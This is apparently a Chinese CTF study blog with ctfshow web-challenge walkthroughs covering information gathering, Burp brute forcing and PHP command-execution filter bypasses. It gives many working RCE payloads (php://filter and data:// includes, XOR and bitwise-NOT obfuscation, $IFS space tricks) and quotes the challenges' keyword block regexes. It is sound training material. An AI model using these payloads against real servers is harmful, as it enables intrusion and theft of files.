---
title: ctfshow
date: 2026-05-23 12:00:00
tags: ctfshow, CTF, Web安全, 渗透, RCE
---

# ctfshow

## web信息收集

拿到题首先一键三联

1.F12，查看源码    <u>（鼠标右键）（F12）（在url前加view-source:）</u>

2.bp抓包

3.dirsearch扫描 （扫到目录后可以加上这个目录再扫）（robots.txt可以被扫到）


使用命令 nslookup <!-- memo: 这是定义要看的后缀名
 --> flag.ctfshow.com可以查到该域名下的东西

tz.php  如果开发者没有删的话也可以从php探针获得一些信息

var/www/html（**这就是到网页的路径**）



Ctrl+f是源码打开搜索框

Ctrl+w是退出查看源码

Shift+Insert可以粘贴东西到kali终端
### web1

f12打开控制台，发现flag
### web2

前端拦截无法按f12查看源代码

通过在url前加view-source:

可以看到源代码
### web3

题目提示抓包，刷新后f12在网络里找协议头
### web4

robots.txt 一个非常重要得到文件，通常情况下，主要用于指定搜索引擎蜘蛛spider在网站里的抓取范围,用于声明蜘蛛**不可以**抓取哪些网站资源及可以抓取哪些网站资源。

题目提示了robots

就url+robots.txt

发现flag
### web5

wp说直接在url后面加上/index.phps

加载后下载了一个文件，上面有flag

index.phps的作用是高亮显示源码，是源码泄露

index.php就是执行php代码
### web6

提示说直接在后面加www.zip

加了过后下载了一个zip

文件提示flag在fl000g.txt中

在网页上url后面拼接一个fl000g.txt得到flag
### web7

根据提示说是源码泄露

直接url+.git/index.php

打开就是flag

CTF的web入门——flag的含义与简单使用理解（信息搜集）（七）版本控制与git仓库的初步理解 Git 是一个分布式的版本控制系统，广泛应用于代码管理。它允许开发者追踪项目文件的更改历史，并协作开发。 Git 泄露 、版本控制漏洞是常见的安全问题，在开发者没有适当配置 Git 的情况下，直接**利用dirsearch进行扫描**，得到对应的git文件与ok状态的访问地址；之后直接进行访问，得到对应的flag

实测dirsearch扫到git

直接url+.git就能得到flag

（git是文件哦，不是后缀名，不能继续扫了）
### web8

dirsearch扫到.svn

url/.svn获得flag
### web9

vim 在编辑文件时会创建临时文件

如果文件正常退出 临时文件自动删除

如果文件意外退出 就会保留临时文件

例如

vim 在编辑 demo.txt 文件时意外退出 会保留临时文件 .demo.txt.swp

第二次编辑 demo.txt 文件时意外退出 会保留临时文件 .demo.txt.swo

第三次编辑 demo.txt 文件时意外退出 会保留临时文件 .demo.txt.swn

第四次编辑 demo.txt 文件时意外退出 会保留临时文件 .demo.txt.swm

第五次编辑 demo.txt 文件时意外退出 会保留临时文件 .demo.txt.swl

访问 /index.php.swp

下载 查看文件内容 得到 Flag
### web10

提示cookie

抓包后cookie上有flag
### web11

题目说这个域名 flag.ctfshow.com下有flag

使用命令 nslookup -qt=txt flag.ctfshow.com

可以查到该域名下的东西

本题考查的依旧是信息收集方面的知识——DNS协议基础

DNS不仅可以储存域名还可以储存这些： • A记录：存IP地址 • TXT记录：存任意文本（出题人最爱藏flag的地方！） CNAME记录：域名别名
### web12

在网页最下方的联系电话很像登录密码

加上题目提示密码可能就在网页中

知道密码但是不知道账号

robots.txt得到不允许/admin/

访问url/admin

提示要账号密码

密码372619038
### web13

在这个网站的最下面有个document可以点开

（一开始我都没有找到这个document）

点开后是产品使用手册，还有账号和密码和登录的网址！？

进去使用账密登录就行了
### web14

题目说源码可能泄露重要（editor）信息

在网页右键鼠标打开源码，搜索editor,发现存在editor/这个路径

**Ctrl+F能打开搜索框**

在url后面拼接editor后出现一个编辑器，有文件上传的地方

打开后发现能看到所有的文件

在var/www/html（**这就是到网页的路径**）中发现一个nothingishere的文件夹，里面有flag.txt

需要注意拼接的路径问题

直接拼接nothingishere/flag.txt
### web15

拼接admin进入登录界面

发现有忘记密码选项

需要回答问题，问我居住在哪个城市

在网页的最下方邮箱中可以知道qq号

搜索得到居住地

获得密码，账号是admin

得到flag
### web16

根据提示在url后面拼接tz.php

进入一个叫微软雅黑PHP探针的网页

其中没有flag

表格中有个phpinfo可以打开

打开后跳转到另一个网页

在后面找到flag


tz.php是网站所有者拿来测试的工具，可以了解服务器的各项信息，使用后要删除，避免普通访客使用

这个网站没有删除tz.php这个php探针
### web17

提示说backup.sql

在url后面拼接这个会下载一个backup.sql文件

上面有flag

或者使用dirsearch扫也能扫到
### web18

打开是一个小游戏

是js编的游戏

查看源码，有js文件

打开发现在score大于100后会输出\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b

解码后是

你赢了，去幺幺零点皮爱吃皮看看

去110.php

得到flag
### web19

提示说不要把密码放在前端

查看源码发现了密码

密码是AES加密

解密后登录获得flag
### web20

没有思路先一键三联，源码控制台dirsearch，dirsearch扫到/db

继续扫扫到db.mdb

所以拼接/db/db.mdb

下载了一个文件

打开后找到flag
## 爆破

bp抓包发送到intruder，选择要爆破的位置，选择字典
### web21

bp抓包

发送到intruder准备爆破

Authorization：Basic后面是base64编码的刚刚输入的账号和密码

框住它点击上方的add


在右边的第一栏payload上

在Payload configuration   Load导入字典

在Payload processing上add

add prefix（设置前缀，因为已知账号是admin且这段base64编码上传前的片段是“账号名：密码”）admin：

encode（把字典中的编码为base64）选base64

最下方Payload encoding 不打勾，因为是base64编码对=有影响

点attack开始攻击

有一个状态码不一样，发送到intruder，有base64解码出来的密码
### web22

考察使用工具爆破子域名

可以用layer，oneforall，360quake

360quake 使用空间搜索引擎--->360quake  搜索语法--->domain="ctf.show"    可以搜索出子域名--->vip.ctf.show  可以发现子域名vip.ctf.show下面有flag--->flag{ctf_show_web}
### web23

直接使用AI一把梭
### web24

直接不会就AI一把梭

这道题考查的知识点是PHP伪伪随机数，它有一个固定的种子，所以说每个生成的第一个随机数都是一样的。

只需要运行一下得到的一个生成的随机数就可以了
### web25

### web26

### web27

这道题的思路是爆别人身份证

前后几位已知，只差出生年月日

写脚本来爆
## php命令执行（RCE）

主要目的：执行获得flag的命令，需要先ls找到flag在哪里

system('cat flag.php');

1.过滤flag时使用*通配符，或者fla?,（此时依旧可能出问题，可以用fl''ag,前提是没有过滤引号）


2.过滤了system时可以使用拼接法web30，"."起连接的作用


```php
/?c=$a='sys';$b='tem';$d=$a.$b;$d('tac fl*');
```


3.?c=eval($_GET[1]);&1=passthru("tac%09fla*");这里是使用的嵌套，使用嵌套可以绕过大部分，这里&是不会被过滤的，因为不在c=的范围内。eval（）是当作php代码执行


4.过滤的太多可以使用伪协议，要有include和$,/

?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php

?>代替 ; 看web32


5.代替空格的方法


```php
使用$IFS$9或者%09，${IFS},可以绕过空格,<也可以
```


6.过滤所有但是可以使用字母时，看web40


7.发现flag.php里面没有flag时使用nl命令查看根目录下文件

可以先ls /     看所有根目录文件名，注意ls后面有空格

c=nl /flag

8.使用/bin/ta?可以代替tac命令

9.web56是脚本，上传文件执行

10.web57是构造数字
### web29

```php

error_reporting(0);//关闭所有错误提示，不再报错
if(isset($_GET['c'])){//通过urlGET获得参数c   
//isset（）检查c是否存在 存在-->继续下一步 不存在-->跳到else后面
    $c = $_GET['c'];//把网址中的c存在变量$c里面
    if(!preg_match("/flag/i", $c)){//preg_match 搜索字符  !取反
// /i忽略大小写    意思是$C中不存在时flag执行下一步
        eval($c);//把字符串当php代码执行
    }
    
}else{
    highlight_file(__FILE__);//显示php源代码
}
```

readfile("执行查看文件的命令")

system("执行linux系统的操作命令")

所以原则上答案可以是

/?c=system("ls")；  **************************命令要用；结尾！

可以看到有两个文件

/?c=system("tac fla*");

*是通配符,匹配0~多个字符

f*时系统会匹配所有开头是f的文件

但是*只在system系统操作中有效

在正则表达式和readfile中无效
### web30

这次过滤了flag|system|php

使用拼接法执行命令


```php
/?c=$a='sys';$b='tem';$d=$a.$b;$d('tac fl*');
//存储$a,$b  $d=ab拼接=‘system’  执行system('tac fl*')
```

​``tac fl*`​`反引号和system的作用一样
### web31

?c=echo``tac%09fla*;` `​在php中反引号包裹的内容会被当做shell命令执行​


```php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

过滤了空格和 . 所以不能拼接了，并且要想方法替代空格

%09是tab可以替换空格   ${IFS}也可以替换空格

?c=eval($_GET[1]);&1=passthru("tac%09fla*");这里是使用的嵌套

passthru替代system

注意使用echo后面不是必须加括号因为echo本身不是函数
### web32

```php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

此时过滤了大多数能直接用于命令执行的命令，需要用另外的方法

?>绕过分号原理是：php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?>前可以不写分号

%0a是回车可以代替空格


```php
?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```

**?c=include$_GET[1]?>**   执行1 include包含并运行指定的文件

&分隔不同的GET参数

​php://filter​

这是 PHP 的一个内置“伪协议”。它不是一个真实的网络协议，而是 PHP 提供的一种特殊方式，用于在打开数据流（如读取文件）时，对数据进行过滤或转换。

​convert.base64-encode​

对数据流的内容进行base64编码

如果直接输出会执行代码，转化成base64再解码就行了

​resource=flag.php​

指定需要处理的目标文件
### web33

只是多过滤了个双引号，上一题的payload依然可以用
### web34

多过滤了冒号，还是使用之前的payload
### web35

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这次把等号过滤掉了但是不影响c=这个赋值的过程，php只解析$_GET的值

所以还是之前的payload
### web36

这里把0~9过滤了，所以把之前的变量名改成b就行
### web37

```php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

此时c是直接include了

此时flag被过滤了，而在这里不能使用通配符，因为此时是php内核处理，不支持通配符，只有类似system的执行shell的才能使用

**此时使用data：//+伪协议+base64绕过**

data：//协议的语法

data是php支持的一种封装流协议(伪协议)

data://[媒体类型]<u>[;编码类型]//可以忽略</u>,[数据内容]

**/?c=data://text/plain;base64,PD9waHAgaW5jbHVkZSgiZmxhZy5waHAiKTs/Pg==**


**<?php include("flag.php");?>    //这是先要执行的php代码**
PD9waHAgaW5jbHVkZSgiZmxhZy5waHAiKTs/Pg==   //base64编码得到的结果
?c=data://text/plain;base64,PD9waHAgaW5jbHVkZSgiZmxhZy5waHAiKTs/Pg==    //构造payload
### web38

过滤了file等不影响之前的payload
### web39

```php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```

他已经添加了后缀名可以直接注释掉

?c=data://text/plain,<?=system('tac fla*')?>//   不注释掉也可以不影响
### web40

```php

if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
} 
```

吓哭了，能想到的方法都被过滤了

?c=show_source(next(array_reverse(scandir(pos(localeconv())))));

整个 Payload 的执行顺序是从内向外：
​`localeconv()`​ -> `pos()`​ -> `scandir()`​ -> `array_reverse()`​ -> `next()`​ -> `show_source()`​

### **第一步：获取点号 **`.`​

**代码：** `pos(localeconv())`​

#### **1. **`localeconv()`​

- ​**功能**​：获取与区域设置相关的数字和货币格式信息。
- ​**返回值**​：返回一个​**关联数组**​。
- ​**关键数据**​：在这个数组中，键名为 `decimal_point`​ 的值通常是字符串 `"."`​（小数点）。
- ​**代码表现**​：
  php编辑
  ```
  1// localeconv() 返回的数组结构大致如下
  2array(
  3    'decimal_point' => '.',  // <--- 我们需要的就是这个点
  4    'thousands_sep' => '',
  5    // ... 其他货币符号
  6)
  ```
#### **2. **`pos()`​

- ​**功能**​：这是 `current()`​ 函数的别名，用于返回数组中**当前指针指向**的元素值。
- ​**执行逻辑**​：当 `localeconv()`​ 返回数组后，PHP 的内部指针默认指向第一个元素（即 `decimal_point`​）。
- ​**结果**​：`pos(localeconv())`​ 成功返回字符串 `"."`​。
- ​**目的**​：绕过过滤，因为题目禁止直接输入 `.`​，我们通过函数“算”出了这个字符。
### **第二步：扫描目录**

**代码：** `scandir(pos(localeconv()))`​

- ​**等价代码**​：`scandir('.')`​
- ​**功能**​：`scandir`​ 函数用于列出指定目录中的文件和文件夹。
- ​**参数**​：上一步我们得到了 `"."`​，代表当前目录。
- ​**返回值**​：一个包含文件名的​**索引数组**​。
- ​**结果示例**​（假设目录下有 `index.php`​ 和 `f1ag.php`​）：
  php编辑
  ```
  1array(
  2    0 => ".",      // 当前目录
  3    1 => "..",     // 上级目录
  4    2 => "f1ag.php", // 目标文件（假设 flag 被重命名或就是这个名字）
  5    3 => "index.php"
  6)
  ```
### **第三步：反转数组**

**代码：** `array_reverse(scandir(...))`​

- ​**问题**​：`scandir`​ 返回的数组中，`.`​ 和 `..`​ 排在最前面（索引 0 和 1）。如果我们直接取第一个元素，只能拿到点号，拿不到文件名。
- ​**功能**​：`array_reverse`​ 将数组的顺序完全颠倒。
- ​**结果**​：
  php编辑
  ```
  1array(
  2    0 => "index.php",
  3    1 => "f1ag.php", // 目标文件现在被移到了前面
  4    2 => "..",
  5    3 => "."
  6)
  ```
- ​**目的**​：把真正的文件名移动到数组的前端，方便后续提取。
### **第四步：获取文件名**

**代码：** `next(array_reverse(...))`​

- ​**背景**​：`array_reverse`​ 返回新数组后，数组指针默认指向第一个元素（索引 0，即 `index.php`​）。
- ​**功能**​：`next()`​ 函数将数组指针​**向后移动一位**​，并返回该位置的值。
- ​**执行逻辑**​：
  - 初始指针在 `index.php`​。
  - 执行 `next()`​，指针移动到 `f1ag.php`​。
  - 函数返回 `"f1ag.php"`​。
- ​**目的**​：跳过无关文件（如 `index.php`​），精准选中目标文件。
### **第五步：读取文件**

**代码：** `show_source(...)`​

- ​**等价代码**​：`show_source("f1ag.php")`​
- ​**功能**​：对文件进行语法高亮显示，本质就是​**读取文件内容并输出**​。
- ​**结果**​：屏幕显示出 flag 文件的内容。
### web41

过滤了所有数字字母并只剩下了   |或这个运算符
### 异或，自增，取反分别是什么

| 绕过手段 | 核心符号 | 使用条件（过滤规则） | 核心原理 |
| --- | --- | --- | --- |
| 异或绕过 | ​^​ | 题目没有过滤异或符号^​，且能提供两个未被过滤的字符进行碰撞。 | 利用 PHP 字符串的位运算特性。两个未被过滤的字符（如!​和@​）转换成二进制后逐位异或，结果恰好等于被过滤的目标字符（如a​）。 |
| 取反绕过 | ​~​ | 题目没有过滤波浪号~​，通常用于过滤了绝大多数可见字符的极端场景。 | 利用 ASCII 码的按位取反特性。一个不可见的特殊字符（或 URL 编码后的乱码）经过~​运算后，会还原成正常的字母或数字（如~%8F​还原为p​）。 |
| 自增绕过 | ​++​ | 题目没有过滤点号.​、下划线_​、中括号[]​等用于构造初始字符的符号。 | 利用 PHP 字符自增的推导特性。先通过隐式转换（如数组转字符串得到 "Array"）拿到初始字母 "A"，再通过++​依次推导出 B、C、D... 从而拼出目标单词。 |

在 CTF Web 类的命令执行（RCE）题目中，“异或”是一种非常经典且强大的​**绕过过滤（Bypass）技巧**​。

当题目代码对用户的输入进行了严格的限制（例如过滤了所有的字母、数字或某些特殊符号），导致你无法直接输入 `system`​、`cat`​、`flag`​ 等常规命令时，就可以利用 PHP 中的异或运算符 `^`​ 来“凭空构造”出这些被禁用的字符。

### 💡 异或绕过的核心原理

在 PHP 中，两个字符串进行异或运算时，会先将它们的字符转换为对应的 ASCII 码（二进制形式），然后逐位进行异或运算，最后再将结果转换回字符。

利用这个特性，我们可以寻找两个​**没有被过滤的、看起来毫无意义的特殊字符**​，让它们异或后恰好等于我们想要的字母或数字。

**举个具体的例子：**假设题目过滤了所有的字母，但我们想执行 `phpinfo()`​ 函数。

- 字符 `A`​ 的 ASCII 码是 65，二进制为 `01000001`​。
- 字符 `r`​ 的 ASCII 码是 114，二进制为 `01110010`​。
- 将两者进行异或运算：`01000001 ^ 01110010 = 00110011`​。
- 二进制 `00110011`​ 对应的十进制是 51，在 ASCII 码表中对应的字符正是数字 `3`​。
所以，在 PHP 代码中 `"A"^"r"`​ 的结果就是 `"3"`​。同理，我们可以通过编写脚本，遍历所有可见字符，找到能异或出 `s`​, `y`​, `s`​, `t`​, `e`​, `m`​ 等字母的字符组合，最终拼凑出 `system("cat /flag")`​ 这样的完整命令。

### 🛠️ 在 CTF 中的实际Payload形态

在真实的 CTF 比赛或解题中，你经常会看到类似下面这种像“乱码”一样的 Payload，这就是典型的异或绕过：


```php
("%08%02%08%03%05%0d" ^ "%7b%7b%7b%7c%60%60")("%09%0b%03%0f%0e%06%09%07" ^ "%60%7b%60%60%60%60%60")
```

这段代码看起来非常复杂，但它实际上就是通过异或运算，在服务器内存中动态还原出了类似 `system('ipconfig')`​ 或 `system('cat flag')`​ 的命令并执行。

### 🛡️ 为什么攻击者（出题人）喜欢用异或？

除了绕过 WAF（Web应用防火墙）或题目的正则过滤，异或在安全领域还有以下作用：

- ​**代码混淆与免杀**​：恶意软件或 Webshell 经常使用异或来加密关键的敏感字符串（如 `cmd.exe`​、`eval`​ 等）。因为异或运算具有可逆性（`A ^ B ^ B = A`​），在代码执行时再解密还原，可以有效躲避杀毒软件基于特征码的静态查杀。
- ​**隐蔽性强**​：异或生成的 Payload 通常由大量不可见字符或特殊符号组成，不仅绕过了字母数字限制，也让防御人员很难一眼看出攻击者的真实意图。
简单来说，在 CTF Web 命令执行中，异或就是一把**“字符变形钥匙”**，它能让你在极其受限的环境下，用允许的符号组合出被禁止的命令，从而成功拿到 Flag。

### 📈 自增（Increment）：用 `++`​ 凭空造出字母

**核心原理：**PHP 有一个非常独特的特性：​**字符可以进行自增运算，并且会按照 ASCII 码表的顺序向后推导**​。 比如：`'A'++`​ 的结果是 `'B'`​，`'a'++`​ 的结果是 `'b'`​。

**绕过思路：**既然不能直接输入字母，那我们就想办法搞到**任意一个字母**作为“种子”，然后通过不断地 `++`​ 自增，推导出我们需要的其他字母。

- **如何获取第一个“种子”字母？**通常利用 PHP 的隐式类型转换。例如，将一个空数组 `[]`​ 转换成字符串会变成单词 `"Array"`​。
  - 代码逻辑：`$_ = [] . '';`​ 此时 `$_`​ 的值就是字符串 `"Array"`​。
  - 提取首字母：`$_ = $_[0];`​ 此时 `$_`​ 的值就是大写字母 `"A"`​。
- **如何构造出想要的单词（如** POST​**）？**拿到 `"A"`​ 之后，就可以通过多次自增变成 `S`​、`Y`​、`S`​、`T`​、`E`​、`M`​ 等，再用点号 `.`​ 把它们拼接起来。
**实战 Payload 示例：**假设题目只允许使用 `$ _ . [ ] ( ) + = ;`​ 这些符号，我们可以通过以下代码构造出 `$_POST`​ 变量，从而接收外部传入的指令：


```php
$_=[];$_=@"$_"; // $_ 变成了字符串 "Array"
$_=$_['!'=='@']; // 利用布尔值取索引，拿到首字母 "A"
$_++;$_++;$_++;$_++; // A 经过多次自增，变成了 E (以此类推，构造出需要的字母)
// 最终拼接出 $_POST 并执行动态函数调用
```

很多 CTF 题目中看到的像天书一样的 `$_++`​ 代码，就是在干这件事。

### 🔄 取反（Bitwise NOT）：用 `~`​ 镜像反转出字符

**核心原理：**取反（也叫按位非）使用的是波浪号 ~​ 运算符。它的规则是将字符的二进制位全部翻转（0变1，1变0）。 在 PHP 中，​**一个非字母数字的特殊字符，取反之后很有可能变成一个正常的字母或数字**​。

**绕过思路：**既然不能直接写字母，那我们就去查表，找到目标字母取反之后对应的特殊字符是什么。然后在 Payload 中写出这个特殊字符并加上 `~`​，PHP 在解析时就会把它还原成目标字母。

**实战 Payload 示例：**假设我们要执行 `system`​ 函数，但字母被全禁了。我们可以提前在本地算出 `system`​ 取反后的乱码是什么：

- 本地计算：`echo urlencode(~'system');`​
- 得到结果：`%8C%86%8C%8B%9A%92`​
- **最终 Payload：** 在题目中传入 `(~%8C%86%8C%8B%9A%92)`​，PHP 就会把它还原并解析为 `system()`​。
取反最大的优点是​**短**​。相比于自增需要写一大串 `++`​ 来推导，取反通常只需要一个 `~`​ 加上一串 URL 编码的字符，非常适合有长度限制的题目。

### 💡 总结与对比

- ​**异或 (**^​**)**​：找两个允许的字符，互相异或得到目标字符（A ^ B = C）。
- ​**自增 (**++​**)**​：利用 PHP 特性搞到一个初始字母，然后像数数一样推导（A++ = B）。
- ​**取反 (**~​**)**​：找一个特殊字符，通过二进制翻转得到目标字符（~特殊字符 = 字母）。
这三种手段在 CTF 比赛中经常混合使用，目的只有一个：**在极其苛刻的过滤规则下，拼凑出能够执行系统命令的 PHP 代码。**
### web42

```php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```

这段代码的意思是：**允许用户通过网页传递一个参数** c​**，服务器会把这个参数的内容当作系统命令去执行，但是会把执行后的正常结果全部“丢弃”（隐藏起来），不显示在页面上。**

下面为你逐行拆解它的含义：

### 💻 代码逐行解释

- ​`if(isset($_GET['c'])){`​
  - 检查用户是否通过网址（GET请求）传递了一个叫 `c`​ 的参数。比如访问 `xxx.php?c=ls`​，这里的 `c`​ 就是参数。
- ​`$c=$_GET['c'];`​
  - 如果存在 `c`​ 参数，就把它的值取出来，赋值给 PHP 变量 `$c`​。
- ​`system($c." &gt;/dev/null 2&gt;&amp;1");`​
  - ​**这是最核心的一行**​。`system()`​ 是 PHP 中用来执行系统命令的函数。
  - 它会把变量 `$c`​ 的内容拼接到一段 Linux 命令后面一起执行。
  - ​&gt;/dev/null 2&gt;&amp;1​ **是什么意思？** 这是一段 Linux 的重定向命令：
  - ​`&gt;/dev/null`​：把命令执行后的​**正常输出（标准输出）扔进** /dev/null​**（Linux 里的“黑洞”），也就是不显示任何正常结果**​。
  - ​`2&gt;&amp;1`​：把命令执行报错的**错误信息（标准错误）**也重定向到和正常输出同一个地方（也就是也扔进黑洞）。
  - ​**总结**​：这行代码会执行你传入的命令，但​**无论命令执行成功还是失败，页面上都不会显示任何回显信息**​。
- ​`}else{ highlight_file(__FILE__); }`​
  - 如果用户没有传 `c`​ 参数，就调用 `highlight_file()`​ 函数，把当前这段 PHP 代码高亮显示在网页上。
### 🎯 在 CTF 题目中怎么利用？

既然题目把正常的输出和报错信息都屏蔽了，我们在做题时就需要用到**“命令截断”​**或**​“逻辑绕过”**的技巧。

比如，我们可以传入 `c=ls;ls`​。

- 服务器实际执行的命令是：`ls;ls &gt;/dev/null 2&gt;&amp;1`​
- 分号 `;`​ 在 Linux 中表示执行完前面的命令再执行后面的。
- 这样，**第一个** ls​ 的执行结果会正常显示在页面上（因为它没有被重定向到黑洞），而**第二个** ls​ 的结果会被丢弃。
通过这种方式，我们就可以绕过题目设置的“黑洞”，看到当前目录下的文件（比如 `flag.php`​），然后再用同样的方法（如 `c=cat flag.php;cat flag.php`​）来读取 Flag 的内容。

主要是靠；分隔前后
### web43

把cat和;过滤了

用||代替；

tac代替cat
### web44

过滤了flag

使用？通配符fla?.php
### web45

过滤了空格

使用`$IFS$9`​或者%09，${IFS},可以绕过空格，但是%0a不行




你的这个实验做得非常好！能敏锐地发现 `%0a`​ 和 `%09`​ 表现不一致，说明你已经跨过了“死记硬背 Payload”的阶段，开始真正思考底层的原理了。

为什么 `c=tac%09fla?.php||ls`​ 能成功，而 `%0a`​ 不行？为什么 `$IFS$9`​ 又可以？这背后的核心原因在于 **Shell 对字符的解析机制** 以及 ​system()​ **函数执行命令的方式**​。

### 🛡️ 为什么 %0a 不行，而 %09 可以？

首先我们要知道，`%09`​ 是 **Tab（制表符）** 的 URL 编码，而 `%0a`​ 是 **换行符（Line Feed）** 的 URL 编码。

当你的 Payload 传入后，服务器上的 PHP 代码 `system($c." &gt;/dev/null 2&gt;&amp;1");`​ 会把你的输入和后面的重定向语句拼接起来一起丢给 Linux 的 Shell 去执行。

- **当你使用** %09​ **(Tab) 时：**
  在 Linux Shell 中，Tab 和空格一样，都被视为​**参数分隔符**​。
  服务器实际执行的命令类似于：`tac[TAB]fla?.php||ls &gt;/dev/null 2&gt;&amp;1`​
  Shell 能够完美理解 `tac`​ 是命令，`fla?.php`​ 是参数，中间的 Tab 只是用来隔开它们的。所以命令能正常执行，你也能看到回显。
- **当你使用** %0a​ **(换行) 时：**
  在 Linux Shell 中，换行符是一个​**命令终结符**​。它的作用等同于你敲了一下回车。
  服务器实际执行的命令被换行符强行截断成了两行：
  - **第一行：** `tac`​ （注意，后面没有任何参数）
  - **第二行：** `fla?.php||ls &gt;/dev/null 2&gt;&amp;1`​
  **结果就是：** Shell 先执行了第一行的 `tac`​。因为 `tac`​ 命令后面没有跟任何文件名，它会默认等待标准输入（卡住或报错）。紧接着，第二行的 `fla?.php`​ 会被 Shell 当作**一个新的命令**去尝试执行。但 `fla?.php`​ 只是一个文件名，并不是可执行程序，所以系统会报错提示 `command not found`​。因此，你的 Payload 就失效了。
### 💡 为什么 $IFS$9 也可以？

这就涉及到了 Linux Shell 的一个内置变量 `$IFS`​（Internal Field Separator，内部字段分隔符）。

- ​`$IFS`​ 的默认值就包含了空格、Tab 和换行符。
- ​`$9`​ 是一个位置参数，在普通的命令执行中它通常是空的。
当你写 `$IFS$9`​ 时，Shell 会先解析变量。因为 `$9`​ 是空的，所以 `$IFS$9`​ 最终就被解析成了 `$IFS`​，也就是一个​**空格或制表符**​。Shell 把它当作参数之间的分隔符，所以 `tac$IFS$9fla?.php`​ 就等同于 `tac fla?.php`​，自然就能成功执行了。

### 📌 总结一下

- ​%09​ **(Tab) 和** $IFS$9​：在 Shell 眼里是**“空格”**，用来隔开命令和参数，所以能绕过空格过滤。
- ​%0a​ **(换行)**​：在 Shell 眼里是**“回车”**，会把你的完整命令强行拆成两段，导致命令执行逻辑错乱。
**小建议：**
在 CTF 的命令执行（RCE）题目中，绕过空格过滤的“万金油”通常是 `%09`​、`$IFS$9`​、`${IFS}`​ 。而 `%0a`​ 通常用在另一种场景：当题目过滤了分号 `;`​，你可以用 `%0a`​ 来代替分号，实现执行完一条命令再执行下一条（比如 `127.0.0.1%0als`​）。
### web46

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

直接?c=tac%09fla?.php||
### web47

依旧上一道的payload
### 为什么要先url后面加上问号

在URL的斜杠后面加上问号（`?`​），是为了告诉服务器：“从这里开始，我要给你传参数了”。

结合你提供的这段 PHP 代码来看，`?c=...`​ 里的 `c`​ 正好对应了代码中的 `$_GET['c']`​。在 Web 开发中，问号是 **URL 路径** 和 **查询参数（Query String）** 之间的标准分隔符。

你可以这样理解这个结构：`http://网站域名/文件路径.php?参数名=参数值`​

- ​**斜杠（**/​**）前面**​：告诉服务器要访问哪个具体的文件（比如 `index.php`​）。
- ​**问号（**?​**）**​：是一个“信号”，标志着路径结束，后面跟着的是要传给这个文件的“指令”或“数据”。
- ​**问号后面**​：就是具体的参数。比如 `?c=ls`​，就是把 `ls`​ 这个值赋给变量 `c`​。
### web48

还是上一个的payload
### web49

还是上一个的payload


```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```
### web50

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

开始过滤%了

此时可以用<代替空格，然而使用?c=tac<fla?.php||不行，问题出在问号上面

?c=tac<fl''ag.php||可以得到flag
### web51

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

依旧上一题的payload，tac被过滤了，ta''c就行了
### web52

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

过滤了<但是$又可用了哈哈哈，

需要想方法绕过空格，那就${IFS}

但是给的不是flag，而是$flag="flag_here"


/?c=ls${IFS}/||可以看到当前网页的根目录文件夹名字

​​

这个 Payload `?c=nl${IFS}/fl''ag||`​


**1.** nl​**：替换被禁用的查看命令**

- ​**作用**​：`nl`​ 是 Linux 中用于查看文件内容并自动加上行号的命令。
